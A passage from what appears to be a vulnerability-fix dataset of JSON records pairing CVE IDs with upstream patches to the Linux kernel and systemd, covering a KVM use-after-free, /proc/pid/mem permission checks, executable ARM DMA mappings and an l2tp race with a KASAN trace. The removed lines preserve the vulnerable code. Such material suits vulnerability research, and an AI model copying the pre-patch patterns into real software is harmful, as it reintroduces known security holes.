\tISTG(X86_TRAP_DB,\tdebug,\t\tDEBUG_STACK),\n \tISTG(X86_TRAP_NMI,\tnmi,\t\tNMI_STACK),\n-\tSISTG(X86_TRAP_BP,\tint3,\t\tDEBUG_STACK),\n \tISTG(X86_TRAP_DF,\tdouble_fault,\tDOUBLEFAULT_STACK),\n #ifdef CONFIG_X86_MCE\n \tISTG(X86_TRAP_MC,\t&machine_check,\tMCE_STACK),\ndiff --git a\/arch\/x86\/kernel\/traps.c b\/arch\/x86\/kernel\/traps.c\nindex 3d9b2308e7fad..03f3d7695dacc 100644\n--- a\/arch\/x86\/kernel\/traps.c\n+++ b\/arch\/x86\/kernel\/traps.c\n@@ -577,7 +577,6 @@ do_general_protection(struct pt_regs *regs, long error_code)\n }\n NOKPROBE_SYMBOL(do_general_protection);\n \n-\/* May run on IST stack. *\/\n dotraplinkage void notrace do_int3(struct pt_regs *regs, long error_code)\n {\n #ifdef CONFIG_DYNAMIC_FTRACE\n@@ -592,6 +591,13 @@ dotraplinkage void notrace do_int3(struct pt_regs *regs, long error_code)\n \tif (poke_int3_handler(regs))\n \t\treturn;\n \n+\t\/*\n+\t * Use ist_enter despite the fact that we don't use an IST stack.\n+\t * We can be called from a kprobe in non-CONTEXT_KERNEL kernel\n+\t * mode or even during context tracking state changes.\n+\t *\n+\t * This means that we can't schedule.  That's okay.\n+\t *\/\n \tist_enter(regs);\n \tRCU_LOCKDEP_WARN(!rcu_is_watching(), \"entry code didn't wake RCU\");\n #ifdef CONFIG_KGDB_LOW_LEVEL_TRAP\n@@ -609,15 +615,10 @@ dotraplinkage void notrace do_int3(struct pt_regs *regs, long error_code)\n \t\t\tSIGTRAP) == NOTIFY_STOP)\n \t\tgoto exit;\n \n-\t\/*\n-\t * Let others (NMI) know that the debug stack is in use\n-\t * as we may switch to the interrupt stack.\n-\t *\/\n-\tdebug_stack_usage_inc();\n \tcond_local_irq_enable(regs);\n \tdo_trap(X86_TRAP_BP, SIGTRAP, \"int3\", regs, error_code, NULL);\n \tcond_local_irq_disable(regs);\n-\tdebug_stack_usage_dec();\n+\n exit:\n \tist_exit(regs);\n }\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2010-0291","CWE_ID":"264","category":"security","commit_id":"54f5de709984bae0d31d823ff03de755f9dcac54","commit_message":"From 54f5de709984bae0d31d823ff03de755f9dcac54 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Tue, 24 Nov 2009 07:17:46 -0500\nSubject: untangling do_mremap(), part 1\n\nTake locating vma and checks on it to a separate helper (it will be\nshared between MREMAP_FIXED\/non-MREMAP_FIXED cases when we split\nthem in the next patch)\n\nAcked-by: Russell King <rmk+kernel@arm.linux.org.uk>\nAcked-by: Hugh Dickins <hugh.dickins@tiscali.co.uk>\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm\/mremap.c | 88 ++++++++++++++++++++++++++++++++++++++-----------------------\n 1 file changed, 55 insertions(+), 33 deletions(-)\n\n","diff_code":"diff --git a\/mm\/mremap.c b\/mm\/mremap.c\nindex 97bff2547719..67761361c469 100644\n--- a\/mm\/mremap.c\n+++ b\/mm\/mremap.c\n@@ -261,6 +261,58 @@ static unsigned long move_vma(struct vm_area_struct *vma,\n \treturn new_addr;\n }\n \n+static struct vm_area_struct *vma_to_resize(unsigned long addr,\n+\tunsigned long old_len, unsigned long new_len, unsigned long *p)\n+{\n+\tstruct mm_struct *mm = current->mm;\n+\tstruct vm_area_struct *vma = find_vma(mm, addr);\n+\n+\tif (!vma || vma->vm_start > addr)\n+\t\tgoto Efault;\n+\n+\tif (is_vm_hugetlb_page(vma))\n+\t\tgoto Einval;\n+\n+\t\/* We can't remap across vm area boundaries *\/\n+\tif (old_len > vma->vm_end - addr)\n+\t\tgoto Efault;\n+\n+\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {\n+\t\tif (new_len > old_len)\n+\t\t\tgoto Efault;\n+\t}\n+\n+\tif (vma->vm_flags & VM_LOCKED) {\n+\t\tunsigned long locked, lock_limit;\n+\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n+\t\tlock_limit = current->signal->rlim[RLIMIT_MEMLOCK].rlim_cur;\n+\t\tlocked += new_len - old_len;\n+\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n+\t\t\tgoto Eagain;\n+\t}\n+\n+\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT))\n+\t\tgoto Enomem;\n+\n+\tif (vma->vm_flags & VM_ACCOUNT) {\n+\t\tunsigned long charged = (new_len - old_len) >> PAGE_SHIFT;\n+\t\tif (security_vm_enough_memory(charged))\n+\t\t\tgoto Efault;\n+\t\t*p = charged;\n+\t}\n+\n+\treturn vma;\n+\n+Efault:\t\/* very odd choice for most of the cases, but... *\/\n+\treturn ERR_PTR(-EFAULT);\n+Einval:\n+\treturn ERR_PTR(-EINVAL);\n+Enomem:\n+\treturn ERR_PTR(-ENOMEM);\n+Eagain:\n+\treturn ERR_PTR(-EAGAIN);\n+}\n+\n \/*\n  * Expand (or shrink) an existing mapping, potentially moving it at the\n  * same time (controlled by the MREMAP_MAYMOVE flag and available VM space)\n@@ -340,41 +392,12 @@ unsigned long do_mremap(unsigned long addr,\n \t\/*\n \t * Ok, we need to grow..  or relocate.\n \t *\/\n-\tret = -EFAULT;\n-\tvma = find_vma(mm, addr);\n-\tif (!vma || vma->vm_start > addr)\n-\t\tgoto out;\n-\tif (is_vm_hugetlb_page(vma)) {\n-\t\tret = -EINVAL;\n-\t\tgoto out;\n-\t}\n-\t\/* We can't remap across vm area boundaries *\/\n-\tif (old_len > vma->vm_end - addr)\n-\t\tgoto out;\n-\tif (vma->vm_flags & (VM_DONTEXPAND | VM_PFNMAP)) {\n-\t\tif (new_len > old_len)\n-\t\t\tgoto out;\n-\t}\n-\tif (vma->vm_flags & VM_LOCKED) {\n-\t\tunsigned long locked, lock_limit;\n-\t\tlocked = mm->locked_vm << PAGE_SHIFT;\n-\t\tlock_limit = current->signal->rlim[RLIMIT_MEMLOCK].rlim_cur;\n-\t\tlocked += new_len - old_len;\n-\t\tret = -EAGAIN;\n-\t\tif (locked > lock_limit && !capable(CAP_IPC_LOCK))\n-\t\t\tgoto out;\n-\t}\n-\tif (!may_expand_vm(mm, (new_len - old_len) >> PAGE_SHIFT)) {\n-\t\tret = -ENOMEM;\n+\tvma = vma_to_resize(addr, old_len, new_len, &charged);\n+\tif (IS_ERR(vma)) {\n+\t\tret = PTR_ERR(vma);\n \t\tgoto out;\n \t}\n \n-\tif (vma->vm_flags & VM_ACCOUNT) {\n-\t\tcharged = (new_len - old_len) >> PAGE_SHIFT;\n-\t\tif (security_vm_enough_memory(charged))\n-\t\t\tgoto out_nc;\n-\t}\n-\n \t\/* old_len exactly to the end of the area..\n \t * And we're not relocating the area.\n \t *\/\n@@ -430,7 +453,6 @@ unsigned long do_mremap(unsigned long addr,\n out:\n \tif (ret & ~PAGE_MASK)\n \t\tvm_unacct_memory(charged);\n-out_nc:\n \treturn ret;\n }\n \n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"stoth68000","repo":"media-tree","source":"cve"},{"CVE_ID":"CVE-2016-10150","CWE_ID":"264","category":"security","commit_id":"a0f1d21c1ccb1da66629627a74059dd7f5ac9c61","commit_message":"From a0f1d21c1ccb1da66629627a74059dd7f5ac9c61 Mon Sep 17 00:00:00 2001\nFrom: Dan Carpenter <dan.carpenter@oracle.com>\nDate: Wed, 30 Nov 2016 22:21:05 +0300\nSubject: [PATCH] KVM: use after free in kvm_ioctl_create_device()\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nWe should move the ops->destroy(dev) after the list_del(&dev->vm_node)\nso that we don't use \"dev\" after freeing it.\n\nFixes: a28ebea2adc4 (\"KVM: Protect device ops->create and list_add with kvm->lock\")\nSigned-off-by: Dan Carpenter <dan.carpenter@oracle.com>\nReviewed-by: David Hildenbrand <david@redhat.com>\nSigned-off-by: Radim Kr\u010dm\u00e1\u0159 <rkrcmar@redhat.com>\n---\n virt\/kvm\/kvm_main.c | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n","diff_code":"diff --git a\/virt\/kvm\/kvm_main.c b\/virt\/kvm\/kvm_main.c\nindex 5c360347a1e9f..7f9ee2929cfea 100644\n--- a\/virt\/kvm\/kvm_main.c\n+++ b\/virt\/kvm\/kvm_main.c\n@@ -2889,10 +2889,10 @@ static int kvm_ioctl_create_device(struct kvm *kvm,\n \n \tret = anon_inode_getfd(ops->name, &kvm_device_fops, dev, O_RDWR | O_CLOEXEC);\n \tif (ret < 0) {\n-\t\tops->destroy(dev);\n \t\tmutex_lock(&kvm->lock);\n \t\tlist_del(&dev->vm_node);\n \t\tmutex_unlock(&kvm->lock);\n+\t\tops->destroy(dev);\n \t\treturn ret;\n \t}\n \n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2014-9888","CWE_ID":"264","category":"security","commit_id":"0ea1ec713f04bdfac343c9702b21cd3a7c711826","commit_message":"From 0ea1ec713f04bdfac343c9702b21cd3a7c711826 Mon Sep 17 00:00:00 2001\nFrom: Russell King <rmk+kernel@arm.linux.org.uk>\nDate: Wed, 23 Oct 2013 16:14:59 +0100\nSubject: [PATCH] ARM: dma-mapping: don't allow DMA mappings to be marked\n executable\n\nDMA mapping permissions were being derived from pgprot_kernel directly\nwithout using PAGE_KERNEL.  This causes them to be marked with executable\npermission, which is not what we want.  Fix this.\n\nSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>\n---\n arch\/arm\/mm\/dma-mapping.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/arch\/arm\/mm\/dma-mapping.c b\/arch\/arm\/mm\/dma-mapping.c\nindex f5e1a8471714c..57438506d5246 100644\n--- a\/arch\/arm\/mm\/dma-mapping.c\n+++ b\/arch\/arm\/mm\/dma-mapping.c\n@@ -687,7 +687,7 @@ static void *__dma_alloc(struct device *dev, size_t size, dma_addr_t *handle,\n void *arm_dma_alloc(struct device *dev, size_t size, dma_addr_t *handle,\n \t\t    gfp_t gfp, struct dma_attrs *attrs)\n {\n-\tpgprot_t prot = __get_dma_pgprot(attrs, pgprot_kernel);\n+\tpgprot_t prot = __get_dma_pgprot(attrs, PAGE_KERNEL);\n \tvoid *memory;\n \n \tif (dma_alloc_from_coherent(dev, size, handle, &memory))\n@@ -700,7 +700,7 @@ void *arm_dma_alloc(struct device *dev, size_t size, dma_addr_t *handle,\n static void *arm_coherent_dma_alloc(struct device *dev, size_t size,\n \tdma_addr_t *handle, gfp_t gfp, struct dma_attrs *attrs)\n {\n-\tpgprot_t prot = __get_dma_pgprot(attrs, pgprot_kernel);\n+\tpgprot_t prot = __get_dma_pgprot(attrs, PAGE_KERNEL);\n \tvoid *memory;\n \n \tif (dma_alloc_from_coherent(dev, size, handle, &memory))\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2016-10156","CWE_ID":"264","category":"security","commit_id":"ee735086f8670be1591fa9593e80dd60163a7a2f","commit_message":"From ee735086f8670be1591fa9593e80dd60163a7a2f Mon Sep 17 00:00:00 2001\nFrom: Lennart Poettering <lennart@poettering.net>\nDate: Wed, 11 Nov 2015 22:54:56 +0100\nSubject: [PATCH] util-lib: use MODE_INVALID as invalid value for mode_t\n everywhere\n\n---\n src\/basic\/fs-util.c        | 4 ++--\n src\/core\/timer.c           | 4 ++--\n src\/test\/test-conf-files.c | 3 ++-\n 3 files changed, 6 insertions(+), 5 deletions(-)\n\n","diff_code":"diff --git a\/src\/basic\/fs-util.c b\/src\/basic\/fs-util.c\nindex 7aee404bfcf..cddd4232fce 100644\n--- a\/src\/basic\/fs-util.c\n+++ b\/src\/basic\/fs-util.c\n@@ -311,7 +311,7 @@ int touch_file(const char *path, bool parents, usec_t stamp, uid_t uid, gid_t gi\n         if (fd < 0)\n                 return -errno;\n \n-        if (mode > 0) {\n+        if (mode != MODE_INVALID) {\n                 r = fchmod(fd, mode);\n                 if (r < 0)\n                         return -errno;\n@@ -338,7 +338,7 @@ int touch_file(const char *path, bool parents, usec_t stamp, uid_t uid, gid_t gi\n }\n \n int touch(const char *path) {\n-        return touch_file(path, false, USEC_INFINITY, UID_INVALID, GID_INVALID, 0);\n+        return touch_file(path, false, USEC_INFINITY, UID_INVALID, GID_INVALID, MODE_INVALID);\n }\n \n int symlink_idempotent(const char *from, const char *to) {\ndiff --git a\/src\/core\/timer.c b\/src\/core\/timer.c\nindex c50e891aeb6..06a6035315f 100644\n--- a\/src\/core\/timer.c\n+++ b\/src\/core\/timer.c\n@@ -519,7 +519,7 @@ static void timer_enter_running(Timer *t) {\n         dual_timestamp_get(&t->last_trigger);\n \n         if (t->stamp_path)\n-                touch_file(t->stamp_path, true, t->last_trigger.realtime, UID_INVALID, GID_INVALID, 0);\n+                touch_file(t->stamp_path, true, t->last_trigger.realtime, UID_INVALID, GID_INVALID, MODE_INVALID);\n \n         timer_set_state(t, TIMER_RUNNING);\n         return;\n@@ -555,7 +555,7 @@ static int timer_start(Unit *u) {\n                         \/* The timer has never run before,\n                          * make sure a stamp file exists.\n                          *\/\n-                        touch_file(t->stamp_path, true, USEC_INFINITY, UID_INVALID, GID_INVALID, 0);\n+                        touch_file(t->stamp_path, true, USEC_INFINITY, UID_INVALID, GID_INVALID, MODE_INVALID);\n         }\n \n         t->result = TIMER_SUCCESS;\ndiff --git a\/src\/test\/test-conf-files.c b\/src\/test\/test-conf-files.c\nindex a69698d4ead..86ac513d4f5 100644\n--- a\/src\/test\/test-conf-files.c\n+++ b\/src\/test\/test-conf-files.c\n@@ -26,6 +26,7 @@\n #include \"conf-files.h\"\n #include \"fs-util.h\"\n #include \"macro.h\"\n+#include \"parse-util.h\"\n #include \"rm-rf.h\"\n #include \"string-util.h\"\n #include \"strv.h\"\n@@ -40,7 +41,7 @@ static void setup_test_dir(char *tmp_dir, const char *files, ...) {\n         va_start(ap, files);\n         while (files != NULL) {\n                 _cleanup_free_ char *path = strappend(tmp_dir, files);\n-                assert_se(touch_file(path, true, USEC_INFINITY, UID_INVALID, GID_INVALID, 0) == 0);\n+                assert_se(touch_file(path, true, USEC_INFINITY, UID_INVALID, GID_INVALID, MODE_INVALID) == 0);\n                 files = va_arg(ap, const char *);\n         }\n         va_end(ap);\n","owner":"systemd","repo":"systemd","source":"cve"},{"CVE_ID":"CVE-2012-0056","CWE_ID":"264","category":"security","commit_id":"e268337dfe26dfc7efd422a804dbb27977a3cccc","commit_message":"From e268337dfe26dfc7efd422a804dbb27977a3cccc Mon Sep 17 00:00:00 2001\nFrom: Linus Torvalds <torvalds@linux-foundation.org>\nDate: Tue, 17 Jan 2012 15:21:19 -0800\nSubject: proc: clean up and fix \/proc\/<pid>\/mem handling\nMIME-Version: 1.0\nContent-Type: text\/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nJ\u00fcri Aedla reported that the \/proc\/<pid>\/mem handling really isn't very\nrobust, and it also doesn't match the permission checking of any of the\nother related files.\n\nThis changes it to do the permission checks at open time, and instead of\ntracking the process, it tracks the VM at the time of the open.  That\nsimplifies the code a lot, but does mean that if you hold the file\ndescriptor open over an execve(), you'll continue to read from the _old_\nVM.\n\nThat is different from our previous behavior, but much simpler.  If\nsomebody actually finds a load where this matters, we'll need to revert\nthis commit.\n\nI suspect that nobody will ever notice - because the process mapping\naddresses will also have changed as part of the execve.  So you cannot\nactually usefully access the fd across a VM change simply because all\nthe offsets for IO would have changed too.\n\nReported-by: J\u00fcri Aedla <asd@ut.ee>\nCc: Al Viro <viro@zeniv.linux.org.uk>\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n fs\/proc\/base.c | 145 ++++++++++++++++-----------------------------------------\n 1 file changed, 39 insertions(+), 106 deletions(-)\n\n","diff_code":"diff --git a\/fs\/proc\/base.c b\/fs\/proc\/base.c\nindex 5485a5388ecb..662ddf2ec4f1 100644\n--- a\/fs\/proc\/base.c\n+++ b\/fs\/proc\/base.c\n@@ -198,65 +198,7 @@ static int proc_root_link(struct dentry *dentry, struct path *path)\n \treturn result;\n }\n \n-static struct mm_struct *__check_mem_permission(struct task_struct *task)\n-{\n-\tstruct mm_struct *mm;\n-\n-\tmm = get_task_mm(task);\n-\tif (!mm)\n-\t\treturn ERR_PTR(-EINVAL);\n-\n-\t\/*\n-\t * A task can always look at itself, in case it chooses\n-\t * to use system calls instead of load instructions.\n-\t *\/\n-\tif (task == current)\n-\t\treturn mm;\n-\n-\t\/*\n-\t * If current is actively ptrace'ing, and would also be\n-\t * permitted to freshly attach with ptrace now, permit it.\n-\t *\/\n-\tif (task_is_stopped_or_traced(task)) {\n-\t\tint match;\n-\t\trcu_read_lock();\n-\t\tmatch = (ptrace_parent(task) == current);\n-\t\trcu_read_unlock();\n-\t\tif (match && ptrace_may_access(task, PTRACE_MODE_ATTACH))\n-\t\t\treturn mm;\n-\t}\n-\n-\t\/*\n-\t * No one else is allowed.\n-\t *\/\n-\tmmput(mm);\n-\treturn ERR_PTR(-EPERM);\n-}\n-\n-\/*\n- * If current may access user memory in @task return a reference to the\n- * corresponding mm, otherwise ERR_PTR.\n- *\/\n-static struct mm_struct *check_mem_permission(struct task_struct *task)\n-{\n-\tstruct mm_struct *mm;\n-\tint err;\n-\n-\t\/*\n-\t * Avoid racing if task exec's as we might get a new mm but validate\n-\t * against old credentials.\n-\t *\/\n-\terr = mutex_lock_killable(&task->signal->cred_guard_mutex);\n-\tif (err)\n-\t\treturn ERR_PTR(err);\n-\n-\tmm = __check_mem_permission(task);\n-\tmutex_unlock(&task->signal->cred_guard_mutex);\n-\n-\treturn mm;\n-}\n-\n-struct mm_struct *mm_for_maps(struct task_struct *task)\n+static struct mm_struct *mm_access(struct task_struct *task, unsigned int mode)\n {\n \tstruct mm_struct *mm;\n \tint err;\n@@ -267,7 +209,7 @@ struct mm_struct *mm_for_maps(struct task_struct *task)\n \n \tmm = get_task_mm(task);\n \tif (mm && mm != current->mm &&\n-\t\t\t!ptrace_may_access(task, PTRACE_MODE_READ)) {\n+\t\t\t!ptrace_may_access(task, mode)) {\n \t\tmmput(mm);\n \t\tmm = ERR_PTR(-EACCES);\n \t}\n@@ -276,6 +218,11 @@ struct mm_struct *mm_for_maps(struct task_struct *task)\n \treturn mm;\n }\n \n+struct mm_struct *mm_for_maps(struct task_struct *task)\n+{\n+\treturn mm_access(task, PTRACE_MODE_READ);\n+}\n+\n static int proc_pid_cmdline(struct task_struct *task, char * buffer)\n {\n \tint res = 0;\n@@ -752,38 +699,39 @@ static const struct file_operations proc_single_file_operations = {\n \n static int mem_open(struct inode* inode, struct file* file)\n {\n-\tfile->private_data = (void*)((long)current->self_exec_id);\n+\tstruct task_struct *task = get_proc_task(file->f_path.dentry->d_inode);\n+\tstruct mm_struct *mm;\n+\n+\tif (!task)\n+\t\treturn -ESRCH;\n+\n+\tmm = mm_access(task, PTRACE_MODE_ATTACH);\n+\tput_task_struct(task);\n+\n+\tif (IS_ERR(mm))\n+\t\treturn PTR_ERR(mm);\n+\n \t\/* OK to pass negative loff_t, we can catch out-of-range *\/\n \tfile->f_mode |= FMODE_UNSIGNED_OFFSET;\n+\tfile->private_data = mm;\n+\n \treturn 0;\n }\n \n static ssize_t mem_read(struct file * file, char __user * buf,\n \t\t\tsize_t count, loff_t *ppos)\n {\n-\tstruct task_struct *task = get_proc_task(file->f_path.dentry->d_inode);\n+\tint ret;\n \tchar *page;\n \tunsigned long src = *ppos;\n-\tint ret = -ESRCH;\n-\tstruct mm_struct *mm;\n+\tstruct mm_struct *mm = file->private_data;\n \n-\tif (!task)\n-\t\tgoto out_no_task;\n+\tif (!mm)\n+\t\treturn 0;\n \n-\tret = -ENOMEM;\n \tpage = (char *)__get_free_page(GFP_TEMPORARY);\n \tif (!page)\n-\t\tgoto out;\n-\n-\tmm = check_mem_permission(task);\n-\tret = PTR_ERR(mm);\n-\tif (IS_ERR(mm))\n-\t\tgoto out_free;\n-\n-\tret = -EIO;\n- \n-\tif (file->private_data != (void*)((long)current->self_exec_id))\n-\t\tgoto out_put;\n+\t\treturn -ENOMEM;\n \n \tret = 0;\n  \n@@ -810,13 +758,7 @@ static ssize_t mem_read(struct file * file, char __user * buf,\n \t}\n \t*ppos = src;\n \n-out_put:\n-\tmmput(mm);\n-out_free:\n \tfree_page((unsigned long) page);\n-out:\n-\tput_task_struct(task);\n-out_no_task:\n \treturn ret;\n }\n \n@@ -825,27 +767,15 @@ static ssize_t mem_write(struct file * file, const char __user *buf,\n {\n \tint copied;\n \tchar *page;\n-\tstruct task_struct *task = get_proc_task(file->f_path.dentry->d_inode);\n \tunsigned long dst = *ppos;\n-\tstruct mm_struct *mm;\n+\tstruct mm_struct *mm = file->private_data;\n \n-\tcopied = -ESRCH;\n-\tif (!task)\n-\t\tgoto out_no_task;\n+\tif (!mm)\n+\t\treturn 0;\n \n-\tcopied = -ENOMEM;\n \tpage = (char *)__get_free_page(GFP_TEMPORARY);\n \tif (!page)\n-\t\tgoto out_task;\n-\n-\tmm = check_mem_permission(task);\n-\tcopied = PTR_ERR(mm);\n-\tif (IS_ERR(mm))\n-\t\tgoto out_free;\n-\n-\tcopied = -EIO;\n-\tif (file->private_data != (void *)((long)current->self_exec_id))\n-\t\tgoto out_mm;\n+\t\treturn -ENOMEM;\n \n \tcopied = 0;\n \twhile (count > 0) {\n@@ -869,13 +799,7 @@ static ssize_t mem_write(struct file * file, const char __user *buf,\n \t}\n \t*ppos = dst;\n \n-out_mm:\n-\tmmput(mm);\n-out_free:\n \tfree_page((unsigned long) page);\n-out_task:\n-\tput_task_struct(task);\n-out_no_task:\n \treturn copied;\n }\n \n@@ -895,11 +819,20 @@ loff_t mem_lseek(struct file *file, loff_t offset, int orig)\n \treturn file->f_pos;\n }\n \n+static int mem_release(struct inode *inode, struct file *file)\n+{\n+\tstruct mm_struct *mm = file->private_data;\n+\n+\tmmput(mm);\n+\treturn 0;\n+}\n+\n static const struct file_operations proc_mem_operations = {\n \t.llseek\t\t= mem_lseek,\n \t.read\t\t= mem_read,\n \t.write\t\t= mem_write,\n \t.open\t\t= mem_open,\n+\t.release\t= mem_release,\n };\n \n static ssize_t environ_read(struct file *file, char __user *buf,\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2016-10200","CWE_ID":"264","category":"security","commit_id":"32c231164b762dddefa13af5a0101032c70b50ef","commit_message":"From 32c231164b762dddefa13af5a0101032c70b50ef Mon Sep 17 00:00:00 2001\nFrom: Guillaume Nault <g.nault@alphalink.fr>\nDate: Fri, 18 Nov 2016 22:13:00 +0100\nSubject: l2tp: fix racy SOCK_ZAPPED flag check in l2tp_ip{,6}_bind()\n\nLock socket before checking the SOCK_ZAPPED flag in l2tp_ip6_bind().\nWithout lock, a concurrent call could modify the socket flags between\nthe sock_flag(sk, SOCK_ZAPPED) test and the lock_sock() call. This way,\na socket could be inserted twice in l2tp_ip6_bind_table. Releasing it\nwould then leave a stale pointer there, generating use-after-free\nerrors when walking through the list or modifying adjacent entries.\n\nBUG: KASAN: use-after-free in l2tp_ip6_close+0x22e\/0x290 at addr ffff8800081b0ed8\nWrite of size 8 by task syz-executor\/10987\nCPU: 0 PID: 10987 Comm: syz-executor Not tainted 4.8.0+ #39\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.8.2-0-g33fbe13 by qemu-project.org 04\/01\/2014\n ffff880031d97838 ffffffff829f835b ffff88001b5a1640 ffff8800081b0ec0\n ffff8800081b15a0 ffff8800081b6d20 ffff880031d97860 ffffffff8174d3cc\n ffff880031d978f0 ffff8800081b0e80 ffff88001b5a1640 ffff880031d978e0\nCall Trace:\n [<ffffffff829f835b>] dump_stack+0xb3\/0x118 lib\/dump_stack.c:15\n [<ffffffff8174d3cc>] kasan_object_err+0x1c\/0x70 mm\/kasan\/report.c:156\n [<     inline     >] print_address_description mm\/kasan\/report.c:194\n [<ffffffff8174d666>] kasan_report_error+0x1f6\/0x4d0 mm\/kasan\/report.c:283\n [<     inline     >] kasan_report mm\/kasan\/report.c:303\n [<ffffffff8174db7e>] __asan_report_store8_noabort+0x3e\/0x40 mm\/kasan\/report.c:329\n [<     inline     >] __write_once_size .\/include\/linux\/compiler.h:249\n [<     inline     >] __hlist_del .\/include\/linux\/list.h:622\n [<     inline     >] hlist_del_init .\/include\/linux\/list.h:637\n [<ffffffff8579047e>] l2tp_ip6_close+0x22e\/0x290 net\/l2tp\/l2tp_ip6.c:239\n [<ffffffff850b2dfd>] inet_release+0xed\/0x1c0 net\/ipv4\/af_inet.c:415\n [<ffffffff851dc5a0>] inet6_release+0x50\/0x70 net\/ipv6\/af_inet6.c:422\n [<ffffffff84c4581d>] sock_release+0x8d\/0x1d0 net\/socket.c:570\n [<ffffffff84c45976>] sock_close+0x16\/0x20 net\/socket.c:1017\n [<ffffffff817a108c>] __fput+0x28c\/0x780 fs\/file_table.c:208\n [<ffffffff817a1605>] ____fput+0x15\/0x20 fs\/file_table.c:244\n [<ffffffff813774f9>] task_work_run+0xf9\/0x170\n [<ffffffff81324aae>] do_exit+0x85e\/0x2a00\n [<ffffffff81326dc8>] do_group_exit+0x108\/0x330\n [<ffffffff81348cf7>] get_signal+0x617\/0x17a0 kernel\/signal.c:2307\n [<ffffffff811b49af>] do_signal+0x7f\/0x18f0\n [<ffffffff810039bf>] exit_to_usermode_loop+0xbf\/0x150 arch\/x86\/entry\/common.c:156\n [<     inline     >] prepare_exit_to_usermode arch\/x86\/entry\/common.c:190\n [<ffffffff81006060>] syscall_return_slowpath+0x1a0\/0x1e0 arch\/x86\/entry\/common.c:259\n [<ffffffff85e4d726>] entry_SYSCALL_64_fastpath+0xc4\/0xc6\nObject at ffff8800081b0ec0, in cache L2TP\/IPv6 size: 1448\nAllocated:\nPID = 10987\n [ 1116.897025] [<ffffffff811ddcb6>] save_stack_trace+0x16\/0x20\n [ 1116.897025] [<ffffffff8174c736>] save_stack+0x46\/0xd0\n [ 1116.897025] [<ffffffff8174c9ad>] kasan_kmalloc+0xad\/0xe0\n [ 1116.897025] [<ffffffff8174cee2>] kasan_slab_alloc+0x12\/0x20\n [ 1116.897025] [<     inline     >] slab_post_alloc_hook mm\/slab.h:417\n [ 1116.897025] [<     inline     >] slab_alloc_node mm\/slub.c:2708\n [ 1116.897025] [<     inline     >] slab_alloc mm\/slub.c:2716\n [ 1116.897025] [<ffffffff817476a8>] kmem_cache_alloc+0xc8\/0x2b0 mm\/slub.c:2721\n [ 1116.897025] [<ffffffff84c4f6a9>] sk_prot_alloc+0x69\/0x2b0 net\/core\/sock.c:1326\n [ 1116.897025] [<ffffffff84c58ac8>] sk_alloc+0x38\/0xae0 net\/core\/sock.c:1388\n [ 1116.897025] [<ffffffff851ddf67>] inet6_create+0x2d7\/0x1000 net\/ipv6\/af_inet6.c:182\n [ 1116.897025] [<ffffffff84c4af7b>] __sock_create+0x37b\/0x640 net\/socket.c:1153\n [ 1116.897025] [<     inline     >] sock_create net\/socket.c:1193\n [ 1116.897025] [<     inline     >] SYSC_socket net\/socket.c:1223\n [ 1116.897025] [<ffffffff84c4b46f>] SyS_socket+0xef\/0x1b0 net\/socket.c:1203\n [ 1116.897025] [<ffffffff85e4d685>] entry_SYSCALL_64_fastpath+0x23\/0xc6\nFreed:\nPID = 10987\n [ 1116.897025] [<ffffffff811ddcb6>] save_stack_trace+0x16\/0x20\n [ 1116.897025] [<ffffffff8174c736>] save_stack+0x46\/0xd0\n [ 1116.897025] [<ffffffff8174cf61>] kasan_slab_free+0x71\/0xb0\n [ 1116.897025] [<     inline     >] slab_free_hook mm\/slub.c:1352\n [ 1116.897025] [<     inline     >] slab_free_freelist_hook mm\/slub.c:1374\n [ 1116.897025] [<     inline     >] slab_free mm\/slub.c:2951\n [ 1116.897025] [<ffffffff81748b28>] kmem_cache_free+0xc8\/0x330 mm\/slub.c:2973\n [ 1116.897025] [<     inline     >] sk_prot_free net\/core\/sock.c:1369\n [ 1116.897025] [<ffffffff84c541eb>] __sk_destruct+0x32b\/0x4f0 net\/core\/sock.c:1444\n [ 1116.897025] [<ffffffff84c5aca4>] sk_destruct+0x44\/0x80 net\/core\/sock.c:1452\n [ 1116.897025] [<ffffffff84c5ad33>] __sk_free+0x53\/0x220 net\/core\/sock.c:1460\n [ 1116.897025] [<ffffffff84c5af23>] sk_free+0x23\/0x30 net\/core\/sock.c:1471\n [ 1116.897025] [<ffffffff84c5cb6c>] sk_common_release+0x28c\/0x3e0 .\/include\/net\/sock.h:1589\n [ 1116.897025] [<ffffffff8579044e>] l2tp_ip6_close+0x1fe\/0x290 net\/l2tp\/l2tp_ip6.c:243\n [ 1116.897025] [<ffffffff850b2dfd>] inet_release+0xed\/0x1c0 net\/ipv4\/af_inet.c:415\n [ 1116.897025] [<ffffffff851dc5a0>] inet6_release+0x50\/0x70 net\/ipv6\/af_inet6.c:422\n [ 1116.897025] [<ffffffff84c4581d>] sock_release+0x8d\/0x1d0 net\/socket.c:570\n [ 1116.897025] [<ffffffff84c45976>] sock_close+0x16\/0x20 net\/socket.c:1017\n [ 1116.897025] [<ffffffff817a108c>] __fput+0x28c\/0x780 fs\/file_table.c:208\n [ 1116.897025] [<ffffffff817a1605>] ____fput+0x15\/0x20 fs\/file_table.c:244\n [ 1116.897025] [<ffffffff813774f9>] task_work_run+0xf9\/0x170\n [ 1116.897025] [<ffffffff81324aae>] do_exit+0x85e\/0x2a00\n [ 1116.897025] 